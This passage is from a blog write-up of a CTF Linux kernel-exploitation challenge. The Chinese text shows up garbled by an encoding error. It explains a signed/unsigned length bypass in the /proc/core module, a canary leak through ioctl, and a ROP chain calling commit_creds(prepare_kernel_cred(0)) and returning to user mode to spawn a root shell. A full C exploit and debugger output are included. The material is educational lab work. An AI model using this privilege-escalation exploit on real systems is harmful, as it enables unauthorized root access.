class="line">&#125;</span><br></pre></td></tr></table></figure><br>é¦–å…ˆå¯¹é•¿åº¦è¿›è¡Œäº†æ£€æŸ¥ï¼Œä½†æ³¨æ„æ•°æ®ç±»å‹ï¼Œa1ä¸ºint64ï¼Œè€Œåœ¨qmemcpyå‡½æ•°é‡Œç±»å‹äº†uint16ï¼Œå› æ­¤æˆ‘ä»¬è®¾è®¡a1ä¸º0xffffffff00000000|(real_len)ä½¿int64ä¸ºè´Ÿæ•°ï¼Œä»è€Œç»•è¿‡æ£€æŸ¥çš„åŒæ—¶é€ æˆæº¢å‡ºã€‚</p>
<p>è¿™æ ·åˆ†æä¸‹æ¥åˆ©ç”¨æ€è·¯å°±å¾ˆæ˜ç¡®äº†ï¼š<br>å…ˆåˆ©ç”¨core_read()æ³„éœ²canaryï¼Œä¹‹åå†åˆ©ç”¨core_cpoy_funcåœ¨å†…æ ¸æ ˆé‡Œæ„é€ ropï¼Œä½¿å…¶åœ¨å†…æ ¸æ€æ‰§è¡Œcommit_creds(prepare_kernel_cred(0))ä½¿å¾—è¿›ç¨‹çš„uidgid&#x3D;0ï¼Œç„¶åè¿”å›åˆ°ç”¨æˆ·æ€æ‰§è¡Œsystem(â€œ&#x2F;bin&#x2F;sh)ä»è€Œå®Œæˆææƒã€‚</p>
<p>éš¾ç‚¹åœ¨äºropçš„æ„é€ ã€‚<br>å¯¹äºæ‰§è¡Œcommit_creds(prepare_kernel_cred(0))æ¥è¯´ï¼Œä¼ å‚å’Œç”¨æˆ·æ€çš„ä¸€è‡´ï¼Œä½†è¦æ³¨æ„commit_creds()çš„å‚æ•°æ˜¯prepare_kernel_cred(0)å‡½æ•°çš„è¿”å›å€¼ã€‚<br>ä»å†…æ ¸æ€è¿”å›ç”¨æˆ·æ€æ—¶è¦ç”¨åˆ°æ¡æŒ‡ä»¤swapgså’Œiretqã€‚åœ¨æ‰§è¡Œiretqä¹‹å‰ï¼Œæ‰§è¡ŒswapgsæŒ‡ä»¤ã€‚è¯¥æŒ‡ä»¤é€šè¿‡ç”¨ä¸€ä¸ªMSRä¸­çš„å€¼äº¤æ¢GSå¯„å­˜å™¨çš„å†…å®¹ï¼Œç”¨æ¥è·å–æŒ‡å‘å†…æ ¸æ•°æ®ç»“æ„çš„æŒ‡é’ˆï¼Œç„¶åæ‰èƒ½æ‰§è¡Œç³»ç»Ÿè°ƒç”¨ä¹‹ç±»çš„å†…æ ¸ç©ºé—´ç¨‹åºã€‚</p>
<p>iret(ç‰¹æƒè¿”å›)æŒ‡ä»¤ä»å†…æ ¸ç©ºé—´è¿”å›åˆ°ç”¨æˆ·ç©ºé—´è¿›ç¨‹ã€‚ä½†æ˜¯iret(64ä½ä¸‹ä¸ºiretq)æœŸæœ›çš„ç‰¹å®šçš„å †æ ˆå¸ƒå±€å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">|----------------------|</span><br><span class="line">| iretq_ret            |</span><br><span class="line">|----------------------|</span><br><span class="line">| RIP                  |&lt;== low mem</span><br><span class="line">|----------------------|</span><br><span class="line">| CS                   |</span><br><span class="line">|----------------------|</span><br><span class="line">| EFLAGS               |</span><br><span class="line">|----------------------|</span><br><span class="line">| RSP                  |</span><br><span class="line">|----------------------|</span><br><span class="line">| SS                   |&lt;== high mem</span><br><span class="line">|----------------------|</span><br></pre></td></tr></table></figure>
<p>æ–°çš„ç”¨æˆ·ç©ºé—´æŒ‡ä»¤æŒ‡é’ˆ(RIP)ï¼Œç”¨æˆ·ç©ºé—´å †æ ˆæŒ‡é’ˆ(RSP)ï¼Œä»£ç å’Œå †æ ˆæ®µé€‰æ‹©å™¨(CSå’ŒSS)ä»¥åŠå…·æœ‰å„ç§çŠ¶æ€ä¿¡æ¯çš„EFLAGSå¯„å­˜å™¨ã€‚<br>ä¸€èˆ¬æˆ‘ä»¬ç”¨ä»¥ä¸‹çš„æ‰©å±•å†…è”æ±‡ç¼–è·å¾—æ‰€éœ€çš„å¯„å­˜å™¨çš„å€¼ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">     <span class="keyword">asm</span>(</span><br><span class="line">       <span class="string">&quot; mov %%cs, %0\n&quot;</span></span><br><span class="line">       <span class="string">&quot;mov %%ss,%1\n&quot;</span></span><br><span class="line">       <span class="string">&quot;mov %%rsp,%3\n&quot;</span></span><br><span class="line">       <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">       <span class="string">&quot;popq %2&quot;</span></span><br><span class="line">       :<span class="string">&quot;=r&quot;</span>(tf.cs),<span class="string">&quot;=r&quot;</span>(tf.ss),<span class="string">&quot;=r&quot;</span>(tf.rflags),<span class="string">&quot;=r&quot;</span>(tf.rsp)    <span class="comment">//output</span></span><br><span class="line">       :                                                        <span class="comment">//input</span></span><br><span class="line">       :<span class="string">&quot;memory&quot;</span>                                               <span class="comment">//list of clobbered registerså³æ”¹å˜çš„å†…å®¹</span></span><br><span class="line">    );</span><br><span class="line">    tf.rsp -= <span class="number">4096</span>;</span><br><span class="line">    tf.rip = &amp;launch_shell;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ropï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 50</span><br><span class="line">00:0000â”‚ rsp  0xffffa47a800e7e60 â€”â–¸ 0x7ffec40e5570 â—‚â€” add    byte ptr [rcx - 0x70], dl /* 0x44777d3bde905100 */</span><br><span class="line">01:0008â”‚      0xffffa47a800e7e68 â€”â–¸ 0xffffffffb2200b2f â—‚â€” pop    rdi /* 0x722540358b4cc35f */</span><br><span class="line">02:0010â”‚      0xffffa47a800e7e70 â—‚â€” 0</span><br><span class="line">03:0018â”‚      0xffffa47a800e7e78 â€”â–¸ 0xffffffffb229cce0 â—‚â€” push   rbp /* 0x153d8b48fd894855 */</span><br><span class="line">04:0020â”‚      0xffffa47a800e7e80 â€”â–¸ 0xffffffffb2221e53 â—‚â€” pop    rcx /* 0xffdf89480127c359 */</span><br><span class="line">05:0028â”‚      0xffffa47a800e7e88 â€”â–¸ 0xffffffffb229c8e0 â—‚â€” push   r12 /* 0x4025248b4c655441 */</span><br><span class="line">06:0030â”‚      0xffffa47a800e7e90 â€”â–¸ 0xffffffffb23ae978 â—‚â€” mov    rdi, rax /* 0xc28ee9e1ffc78948 */</span><br><span class="line">07:0038â”‚      0xffffa47a800e7e98 â€”â–¸ 0xffffffffb2c012da â—‚â€” swapgs  /* 0x485590c39df8010f */</span><br><span class="line">08:0040â”‚      0xffffa47a800e7ea0 â—‚â€” 0</span><br><span class="line">09:0048â”‚      0xffffa47a800e7ea8 â€”â–¸ 0xffffffffb2250ac2 â—‚â€” iretq   /* 0x1f0f2e6690c3cf48 */</span><br><span class="line">0a:0050â”‚      0xffffa47a800e7eb0 â€”â–¸ 0x400eac â—‚â€” push   rbp</span><br><span class="line">0b:0058â”‚      0xffffa47a800e7eb8 â—‚â€” 0x33 /* &#x27;3&#x27; */</span><br><span class="line">0c:0060â”‚      0xffffa47a800e7ec0 â—‚â€” 0x282</span><br><span class="line">0d:0068â”‚      0xffffa47a800e7ec8 â€”â–¸ 0x7ffec40e45c0 â—‚â€” 0</span><br><span class="line">0e:0070â”‚      0xffffa47a800e7ed0 â—‚â€” 0x2b /* &#x27;+&#x27; */</span><br><span class="line">0f:0078â”‚      0xffffa47a800e7ed8 â—‚â€” 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*(ptr + i++) = canary;</span><br><span class="line">*(ptr + i++) = rbp;</span><br><span class="line">*(ptr + i++) = prdi_ret;</span><br><span class="line">*(ptr + i++) = 0;</span><br><span class="line">*(ptr + i++) = prepare_kernel_cred;</span><br><span class="line">*(ptr + i++) = prcx_ret;</span><br><span class="line">*(ptr + i++) = commit_creds;</span><br><span class="line">*(ptr + i++) = mov_rdi_rax_jmp_rcx;</span><br><span class="line"></span><br><span class="line">*(ptr + i++) = swapgs_p_ret;</span><br><span class="line">*(ptr + i++) = 0;</span><br><span class="line">*(ptr + i++) = iretq_ret;</span><br><span class="line">*(ptr + i++) = (uint64_t) launch_shell;</span><br><span class="line">*(ptr + i++) = tf.cs;</span><br><span class="line">*(ptr + i++) = tf.rflags;</span><br><span class="line">*(ptr + i++) = tf.rsp;</span><br><span class="line">*(ptr + i++) = tf.ss;</span><br></pre></td></tr></table></figure>

<p>exp:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span>c</span><br><span class="line">    <span class="type">void</span> *rip;</span><br><span class="line">    <span class="type">uint64_t</span> cs;</span><br><span class="line">    <span class="type">uint64_t</span> rflags;</span><br><span class="line">    <span class="type">void</span> * rsp;</span><br><span class="line">    <span class="type">uint64_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> kernel_base=<span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> commit_creds=<span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> commit_creds_offset = <span class="number">0x9c8e0</span>;</span><br><span class="line"><span class="type">uint64_t</span> prepare_kernel_cred_offset = <span class="number">0x9cce0</span>;</span><br><span class="line"><span class="type">uint64_t</span> canary = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint64_t</span> rbp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> prdi_ret = <span class="number">0x0b2f</span>; <span class="comment">//: pop rdi; ret;</span></span><br><span class="line"><span class="type">uint64_t</span> mov_rdi_rax_jmp_rcx = <span class="number">0x1ae978</span>; <span class="comment">//: mov rdi, rax; jmp rcx;</span></span><br><span class="line"><span class="type">uint64_t</span> mov_rdi_rax_jmp_rdx = <span class="number">0x6a6d2</span>; <span class="comment">//: mov rdi, rax; jmp rdx;</span></span><br><span class="line"><span class="type">uint64_t</span> prcx_ret = <span class="number">0x21e53</span>; <span class="comment">//: pop rcx; ret;</span></span><br><span class="line"><span class="type">uint64_t</span> swapgs_p_ret = <span class="number">0xa012da</span>; <span class="comment">//: swapgs; popfq; ret;</span></span><br><span class="line"><span class="type">uint64_t</span> iretq_ret = <span class="number">0x50ac2</span>; <span class="comment">//: iretq; ret;</span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">get_kernel_base</span><span class="params">()</span>&#123;</span><br><span class="line">    FILE *fd;</span><br><span class="line">    <span class="type">uint64_t</span> kernel_base1=<span class="number">0</span>,kernel_base2=<span class="number">0</span>;</span><br><span class="line">    fd=fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="type">char</span> line[<span class="number">0x30</span>];</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        die(<span class="string">&quot;open kallsyms fialed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        fgets(line,<span class="number">0x30</span>,fd);</span><br><span class="line">        <span class="keyword">if</span>(kernel_base!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(line,<span class="string">&quot;commit_creds&quot;</span>)&amp;&amp;!commit_creds)&#123;</span><br><span class="line">            getchar();</span><br><span class="line">            <span class="built_in">sscanf</span>(line,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>,commit_creds);</span><br><span class="line">            kernel_base1=commit_creds-commit_creds_offset;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(line,<span class="string">&quot;prepare_kernel_cred&quot;</span>)&amp;&amp;!prepare_kernel_cred)&#123;</span><br><span class="line">            getchar();</span><br><span class="line">            <span class="built_in">sscanf</span>(line,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">            kernel_base2=prepare_kernel_cred-prepare_kernel_cred_offset;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(kernel_base1!=<span class="number">0</span>&amp;&amp;kernel_base1==kernel_base2)&#123;</span><br><span class="line">            kernel_base=kernel_base1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak</span><span class="params">(<span class="type">int</span> fd)</span>&#123;</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">    <span class="type">uint8_t</span> buffer[<span class="number">0x40</span>];</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889B</span>,buffer);</span><br><span class="line">    canary=*(<span class="type">uint64_t</span> *)buffer;</span><br><span class="line">    rbp=*(<span class="type">uint64_t</span> *)(buffer+<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;canary: %p\n&quot;</span>,canary);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_gadget_addr</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    prdi_ret += kernel_base;</span><br><span class="line">    prcx_ret += kernel_base;</span><br><span class="line">    mov_rdi_rax_jmp_rcx += kernel_base;</span><br><span class="line">    mov_rdi_rax_jmp_rdx += kernel_base;</span><br><span class="line">    swapgs_p_ret += kernel_base;</span><br><span class="line">    iretq_ret += kernel_base;</span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">launch_shell</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">     <span class="keyword">asm</span>(</span><br><span class="line">       <span class="string">&quot; mov %%cs, %0\n&quot;</span></span><br><span class="line">       <span class="string">&quot;mov %%ss,%1\n&quot;</span></span><br><span class="line">       <span class="string">&quot;mov %%rsp,%3\n&quot;</span></span><br><span class="line">       <span class="string">&quot;pushfq\n&quot;</span></span><br><span class="line">       <span class="string">&quot;popq %2&quot;</span></span><br><span class="line">       :<span class="string">&quot;=r&quot;</span>(tf.cs),<span class="string">&quot;=r&quot;</span>(tf.ss),<span class="string">&quot;=r&quot;</span>(tf.rflags),<span class="string">&quot;=r&quot;</span>(tf.rsp)</span><br><span class="line">       :</span><br><span class="line">       :<span class="string">&quot;memory&quot;</span></span><br><span class="line">    );</span><br><span class="line">    tf.rsp -= <span class="number">4096</span>;</span><br><span class="line">    tf.rip = &amp;launch_shell;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">launch_shell</span><span class="params">()</span>&#123;</span><br><span class="line">    execl(<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;sh&quot;</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">bool</span> ret = get_kernel_base();</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="type">uint8_t</span> buffer[<span class="number">0x800</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">    leak(fd);</span><br><span class="line">    set_gadget_addr();</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="type">uint64_t</span> *ptr;</span><br><span class="line">    ptr = (<span class="type">uint64_t</span> *)(buffer+<span class="number">0x40</span>);</span><br><span class="line">    *(ptr + i++) = canary;</span><br><span class="line">    *(ptr + i++) = rbp;</span><br><span class="line">    *(ptr + i++) = prdi_ret;</span><br><span class="line">    *(ptr + i++) = <span class="number">0</span>;</span><br><span class="line">    *(ptr + i++) = prepare_kernel_cred;</span><br><span class="line">    *(ptr + i++) = prcx_ret;</span><br><span class="line">    *(ptr + i++) = commit_creds;</span><br><span class="line">    *(ptr + i++) = mov_rdi_rax_jmp_rcx;</span><br><span class="line"></span><br><span class="line">    *(ptr + i++) = swapgs_p_ret;</span><br><span class="line">    *(ptr + i++) = <span class="number">0</span>;</span><br><span class="line">    *(ptr + i++) = iretq_ret;</span><br><span class="line">    *(ptr + i++) = (<span class="type">uint64_t</span>) launch_shell;</span><br><span class="line">    *(ptr + i++) = tf.cs;</span><br><span class="line">    *(ptr + i++) = tf.rflags;</span><br><span class="line">    *(ptr + i++) = tf.rsp;</span><br><span class="line">    *(ptr + i++) = tf.ss;</span><br><span class="line"></span><br><span class="line">    write(fd,buffer,<span class="number">0x800</span>);</span><br><span class="line">    <span class="type">uint64_t</span> len=<span class="number">0xffffffff00000000</span>;</span><br><span class="line">    <span class="type">uint32_t</span> l=<span class="number">0x100</span>;</span><br><span class="line">    len|=l;</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889A</span>,len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸€ç‚¹è¡¥å……ï¼š<br>é™æ€ç¼–è¯‘exp(å†…æ ¸æ²¡æœ‰cåº“):<br><code>gcc exp.c -static -o exploit</code></p>
<p>æŸ¥æ‰¾gadgetæŒ‡ä»¤ï¼š<br><code>ROPgadget --binary vmlinux &gt; ropgadget</code></p>
<p>è°ƒè¯•æ–¹æ³•ï¼š<br>.shè„šæœ¬é‡Œæœ‰-sæˆ‘ä»¬å¯ä»¥é€šè¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb ./vmlinux</span><br><span class="line">target remote:1234</span><br><span class="line">add-symbol-file core.ko 0xffffffffc0000000  (è¯¥textçš„åŸºåœ°å€é€šè¿‡cat /sys/module/core/sections/.textå¾—åˆ°)</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å°±å¯ä»¥ç›´æ¥æ ¹æ®æ¨¡å—é‡Œçš„å‡½æ•°åä¸‹æ–­äº†ã€‚</p>
<p>ä½†åˆä¸€ç‚¹å¾ˆç–‘æƒ‘çš„æ—¶pwngdbè°ƒå†…æ ¸ç©ºé—´å·¨å¡ï¼Œè€Œä¸”si&#x2F;niç›´æ¥è·‘é£äº†ğŸ¤¦ï¼Œåªèƒ½ä¸‹æ–­ç‚¹å†cè¿™æ ·è°ƒï¼Œruanå¸ˆå‚…è¯´gefè°ƒèµ·æ¥å¾ˆå¿«ï¼Œå¾—å†å»æä¸ªgefæ¥ã€‚</p>
<p>å‚è€ƒåšå®¢ï¼ˆæ„Ÿè°¢ï¼‰ï¼š<br><a target="_blank" rel="noopener" href="https://f5.pm/go-26809.html">https://f5.pm/go-26809.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/T1e9u/p/13805760.html">https://www.cnblogs.com/T1e9u/p/13805760.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/227357.html">https://www.freebuf.com/articles/system/227357.html</a></p>
</div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/CTF/">CTF</a><a class="link-muted mr-2" rel="tag" href="/tags/KERNEL/">KERNEL</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2020/11/08/kernel_pwn(2)/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">kernel_pwn Double_fetch</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2020/11/04/Xnuca2020%E7%BA%BF%E4%B8%8A%E8%B5%9B/"><span class="level-item">Xnuca2020çº¿ä¸Šèµ›l</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><!--!--><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">An9Ela</a><p class="is-size-7"><span>&copy; 2022 An9Ela</span>Â Â Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>Â &amp;Â <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("default");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><!--!--><script src="/js/main.js" defer></script><!--!--></body></html>